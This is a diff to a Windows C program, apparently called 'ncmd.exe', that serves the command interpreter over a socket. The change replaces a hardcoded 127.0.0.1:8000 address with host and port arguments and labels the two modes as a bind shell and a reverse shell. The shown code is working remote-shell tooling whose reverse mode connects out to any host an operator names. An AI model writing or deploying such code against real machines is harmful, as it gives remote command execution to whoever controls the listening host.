@@ -5,9 +5,6 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-#define SERVER "127.0.0.1"
-#define PORT 8000
-
 char* USAGE =
     "Starts a new instance of the windows command interpreter over a socket connection.\n"
     "\n"
@@ -80,14 +77,14 @@ SOCKET ListenForClient(char* host, int port) {
     return clientSocket;
 }
 
-SOCKET ConnectToServer() {
+SOCKET ConnectToServer(char* host, int port) {
     SOCKET clientSocket;
     struct sockaddr_in serverAddr;
 
     clientSocket = CreateSocket();
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_addr.s_addr = inet_addr(SERVER);
-    serverAddr.sin_port = htons(PORT);
+    serverAddr.sin_addr.s_addr = inet_addr(host);
+    serverAddr.sin_port = htons(port);
 
     if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         printf("Failed to connect to the server.\n");
@@ -137,6 +134,7 @@ int main(int argc, char* argv[]) {
     }
 
     if (listen) {
+        // Bind shell
         // ncmd.exe /L ...
 
         // if no host or port, exit
@@ -155,7 +153,16 @@ int main(int argc, char* argv[]) {
 
         sock = ListenForClient(host, port);
     } else {
-        sock = ConnectToServer();
+        // Reverse shell
+        // ncmd.exe ...
+
+        // if host and port not given, exit.
+        if (port == -1) {
+            printf("%s\n", USAGE);
+            return 1;
+        }
+
+        sock = ConnectToServer(host, port);
     }
 
     if (sock == INVALID_SOCKET)
